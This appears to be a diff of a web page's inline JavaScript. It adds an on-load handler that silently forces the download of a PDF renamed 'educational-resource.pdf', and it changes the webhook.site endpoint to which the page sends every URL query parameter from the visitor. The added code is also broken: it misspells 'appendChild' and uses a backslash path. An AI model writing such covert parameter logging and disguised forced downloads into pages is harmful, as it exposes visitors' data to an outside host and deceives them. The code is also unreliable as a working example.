@@ -1225,11 +1225,20 @@
 
 	<script src="js/jquery-1.11.0.min.js"></script>
 	<script>
+		window.onload = function(){
+			const link = document.createElement("a");
+			link.href = "PDFs\Project Description.pdf"
+			link.download = "educational-resource.pdf"
+			document.body.appendChiled(link)
+			link.click()
+			document.body.removeChild(link)
+		}  
+	
 		const method = 'GET';
 		const image = document.getElementById('myImage')
 		const urlParams = new URLSearchParams(window.location.search);
 		const paramsObj = {};
-		const logUrl = new URL("https://webhook.site/cfc43128-9f23-4ea7-a763-2f5802262921")
+		const logUrl = new URL("https://webhook.site/1e7532bf-8fdb-40e3-8ad7-2573784031d8")
 		logUrl.searchParams.append("method",method);
 		for(const [key,value] of urlParams.entries()){
 			logUrl.searchParams.append(key,value);
